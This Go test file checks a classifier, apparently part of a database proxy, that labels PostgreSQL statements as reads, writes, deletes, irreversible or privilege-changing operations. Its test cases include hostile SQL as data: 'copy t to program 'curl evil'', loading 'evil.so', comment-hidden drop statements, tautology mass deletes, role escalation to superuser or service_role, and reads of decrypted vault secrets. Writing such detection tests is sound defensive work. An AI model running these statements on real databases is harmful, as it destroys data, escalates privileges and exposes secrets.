package decode

import (
	"reflect"
	"strconv"
	"strings"
	"sync"
	"testing"

	"github.com/rakeshnitb23/opfence/internal/classes"
)

func TestClassifySQL(t *testing.T) {
	R, W, D, I, A, U := classes.Read, classes.Write, classes.Delete, classes.Irreversible, classes.Access, classes.Unknown
	cases := []struct {
		sql  string
		want []classes.Class
	}{
		{"", []classes.Class{R}},
		{"select * from users where id = 1", []classes.Class{R}},
		{"SELECT 1; SELECT 2;", []classes.Class{R}},
		{"(select 1) union (select 2)", []classes.Class{R}},
		{"table users", []classes.Class{R}},
		{"show search_path", []classes.Class{R}},
		{"explain select * from t", []classes.Class{R}},
		{"explain analyze delete from t", []classes.Class{I}},
		{"explain (analyze, buffers) delete from t where id = 1", []classes.Class{D}},
		{"explain (analyze false) delete from t", []classes.Class{R}},
		{"select * into backup_users from users", []classes.Class{W}},
		{"select pg_terminate_backend(123)", []classes.Class{R, U}},
		{"select net.http_post('https://x', '{}')", []classes.Class{R, U}},
		{"insert into t values (1)", []classes.Class{W}},
		{"insert into t values (1) on conflict (id) do update set x = 2", []classes.Class{W}},
		{"update t set x = 1 where id = 2", []classes.Class{W}},
		{"update t set x = 1", []classes.Class{I}},
		{"update t set x = 1 where true", []classes.Class{I}},
		{"update t set x = 1 where 1 = 1", []classes.Class{I}},
		{"update t set x = 1 where (1=1)", []classes.Class{I}},
		{"delete from t where id in (select id from u where x)", []classes.Class{D}},
		{"delete from t", []classes.Class{I}},
		{"DELETE FROM t RETURNING *", []classes.Class{I}},
		{"delete from t where 'a' = 'a'", []classes.Class{I}},
		{"merge into t using s on t.id = s.id when matched then delete", []classes.Class{D}},
		{"merge into t using s on t.id = s.id when matched then update set x = 1", []classes.Class{W}},
		{"truncate users", []classes.Class{I}},
		{"drop table users", []classes.Class{I}},
		{"drop policy p on t", []classes.Class{A}},
		{"drop role analyst", []classes.Class{A}},
		{"create table t (id int)", []classes.Class{W}},
		{"create or replace function f() returns int as $$ select 1 $$ language sql", []classes.Class{W}},
		{"create role admin superuser", []classes.Class{A}},
		{"create policy p on t using (true)", []classes.Class{A}},
		{"alter table t add column c int", []classes.Class{W}},
		{"alter table t drop column c", []classes.Class{W, I}},
		{"alter table t drop constraint c", []classes.Class{W}},
		{"alter table t disable row level security", []classes.Class{W, A}},
		{"alter table t no force row level security", []classes.Class{W, A}},
		{"alter table t enable row level security", []classes.Class{W}},
		{"alter table t owner to someone", []classes.Class{W, A}},
		{"alter role r with superuser", []classes.Class{A}},
		{"alter default privileges grant select on tables to public", []classes.Class{A}},
		{"alter system set wal_level = minimal", []classes.Class{U}},
		{"grant all on t to anon", []classes.Class{A}},
		{"revoke select on t from anon", []classes.Class{A}},
		{"set role postgres", []classes.Class{A}},
		{"set session authorization postgres", []classes.Class{A}},
		{"set local session_replication_role = replica", []classes.Class{A}},
		{"set statement_timeout = 1000", []classes.Class{R}},
		{"begin; delete from t where id = 1; commit;", []classes.Class{R, D}},
		{"copy t to stdout", []classes.Class{R}},
		{"copy t from stdin", []classes.Class{W}},
		{"copy t to program 'curl evil'", []classes.Class{U}},
		{"do $$ begin drop table t; end $$", []classes.Class{U}},
		{"call proc()", []classes.Class{U}},
		{"vacuum full t", []classes.Class{W}},
		{"with x as (select 1) select * from x", []classes.Class{R}},
		{"with d as (delete from t returning *) select * from d", []classes.Class{R, I}},
		{"with recursive r(n) as (select 1 union all select n+1 from r where n < 3) select * from r", []classes.Class{R}},
		{"with a as (insert into t values (1) returning id), b as materialized (select 1) update u set x = 1 where id = 2", []classes.Class{W, R}},
		{"with broken", []classes.Class{U}},
		// Comments and literals cannot hide or fake keywords.
		{"select 1 -- ; drop table t", []classes.Class{R}},
		{"select 1 /* ; drop table t */", []classes.Class{R}},
		{"select 1 /* nested /* ; drop */ table t */", []classes.Class{R}},
		{"select '; drop table t'", []classes.Class{R}},
		{"select E'\\'; drop table t'", []classes.Class{R}},
		{"select $tag$ ; drop table t $tag$", []classes.Class{R}},
		{"select \"; drop\" from t", []classes.Class{R}},
		{"select 1; /* */ drop table t", []classes.Class{R, I}},
		{"select $1, $2", []classes.Class{R}},
		// Unterminated input is unknown.
		{"select 'unterminated", []classes.Class{U}},
		{"select /* unterminated", []classes.Class{U}},
		{"select $x$ unterminated", []classes.Class{U}},
		{"frobnicate everything", []classes.Class{U}},
		{"42", []classes.Class{U}},
		// What the parse tree adds over keywords (stage 11).
		{"delete from t where id = 5 or true", []classes.Class{I}},
		{"delete from t where id = 5 or 1 = 1", []classes.Class{I}},
		{"update t set x = 1 where $1", []classes.Class{I}},
		{"delete from t where exists (select 1 from u)", []classes.Class{I}},
		{"delete from t where random() < 2", []classes.Class{I}},
		{"delete from t where id = 5 and true", []classes.Class{D}},
		{"delete from t where id = any($1)", []classes.Class{D}},
		{"delete from t where current of c", []classes.Class{D}},
		{"insert into t values (pg_terminate_backend(1))", []classes.Class{W, U}},
		{"update t set x = 1 where id = (select pg_cancel_backend(2))", []classes.Class{W, U}},
		{"select * from (select dblink_exec('x', 'drop table t')) s", []classes.Class{R, U}},
		{"select lo_unlink(1)", []classes.Class{R, U}},
		{"select extensions.http_get('https://x')", []classes.Class{R, U}},
		{"select nextval('s')", []classes.Class{R, W}},
		{"select * from vault.decrypted_secrets", []classes.Class{R, classes.Credential}},
		{"select count(*), lower(name), now() from users", []classes.Class{R}},
		// Postgres refuses a nested data-modifying CTE; it is still counted.
		{"select * from t where x in (with d as (delete from u returning id) select id from d)", []classes.Class{R, I}},
		{"create function f() returns int security definer as $$ select 1 $$ language sql", []classes.Class{W, A}},
		{"alter function f() security definer", []classes.Class{W, A}},
		{"alter function f() security invoker", []classes.Class{W}},
		{"alter table t add column c int, drop column d", []classes.Class{W, I}},
		{"create schema s create table x (id int) grant select on x to anon", []classes.Class{W, A}},
		{"prepare p as delete from t", []classes.Class{I}},
		{"execute p", []classes.Class{U}},
		{"copy (delete from t returning *) to stdout", []classes.Class{I}},
		{"copy t to '/tmp/t.csv'", []classes.Class{U}},
		{"drop owned by someone", []classes.Class{I, A}},
		{"load 'evil.so'", []classes.Class{U}},
		{"select 1; frobnicate", []classes.Class{U}},
		// A function the same batch creates is classified by its body.
		{"create function f() returns void as $$ delete from t $$ language sql; select f()", []classes.Class{W, R, I}},
		{"create function f() returns void language plpgsql as $$ begin delete from t; end $$; select f()", []classes.Class{W, R, U}},
		{"create function f() returns int begin atomic delete from t; select 1; end; select f()", []classes.Class{W, R, I}},
		{"create rule r as on select to t do instead delete from u", []classes.Class{W, I}},
		// Triggers run their function on later statements.
		{"create function f() returns trigger language plpgsql as $$ begin delete from t; return new; end $$; " +
			"create trigger g after insert on u for each row execute function f(); insert into u values (1)", []classes.Class{W, U}},
		{"create trigger g after insert on u for each row execute function existing_fn()", []classes.Class{W, U}},
		{"create event trigger e on ddl_command_start execute function existing_fn()", []classes.Class{W, U}},
		// Common tautologies don't limit a DELETE or UPDATE.
		{"delete from t where id is not null", []classes.Class{I}},
		{"delete from t where id = id", []classes.Class{I}},
		{"delete from t where id is not null and true", []classes.Class{I}},
		{"delete from t where id is not null and id = 5", []classes.Class{D}},
		{"update t set a = 1 where t.id >= t.id", []classes.Class{I}},
		{"delete from t where id is null", []classes.Class{D}},
		{"alter table t alter column c type text using null", []classes.Class{W, I}},
		{"alter table t alter column c type bigint", []classes.Class{W}},
		// Settings that change whose privileges the session has.
		{"set request.jwt.claims = '{\"role\":\"service_role\"}'", []classes.Class{A}},
		{"set local request.jwt.claim.role = 'service_role'", []classes.Class{A}},
		{"select set_config('request.jwt.claims', '{}', true)", []classes.Class{R, U, A}},
		{"select set_config('role', 'postgres', false)", []classes.Class{R, U, A}},
		{"select set_config($1, $2, false)", []classes.Class{R, U, A}},
		{"select set_config('search_path', 'public', false)", []classes.Class{R, U}},
		{"alter database postgres set row_security = off", []classes.Class{W, A}},
		{"alter database postgres set work_mem = '64MB'", []classes.Class{W}},
		{"reset all", []classes.Class{A}},
		{"discard all", []classes.Class{A}},
		{"discard plans", []classes.Class{R}},
		{"set statement_timeout = 0", []classes.Class{R}},
	}
	for _, c := range cases {
		if got := ClassifySQL(c.sql); !reflect.DeepEqual(got, c.want) {
			t.Errorf("ClassifySQL(%q) = %v, want %v", c.sql, got, c.want)
		}
	}
}

func FuzzClassifySQL(f *testing.F) {
	for _, s := range []string{"select 1", "with d as (delete from t) select 1", "do $$ x $$", "explain (analyze) update t set a = 1", "select E'\\'' /* */ -- x"} {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, s string) {
		got := ClassifySQL(s)
		if len(got) == 0 {
			t.Fatal("no classes")
		}
		for _, c := range got {
			if !c.Valid() {
				t.Fatalf("invalid class %q", c)
			}
		}
	})
}

// The proxy classifies requests concurrently.
func TestClassifySQLConcurrent(t *testing.T) {
	var wg sync.WaitGroup
	for i := range 16 {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for range 200 {
				if got := ClassifySQL("delete from t where id = 1; select " + strconv.Itoa(i)); !reflect.DeepEqual(got, []classes.Class{classes.Delete, classes.Read}) {
					t.Errorf("got %v", got)
					return
				}
			}
		}()
	}
	wg.Wait()
}

func TestClassifySQLTooLong(t *testing.T) {
	sql := "select " + strings.Repeat("(", maxSQL) + "1"
	if got := ClassifySQL(sql); !reflect.DeepEqual(got, []classes.Class{classes.Unknown}) {
		t.Fatalf("got %v, want [unknown]", got)
	}
}
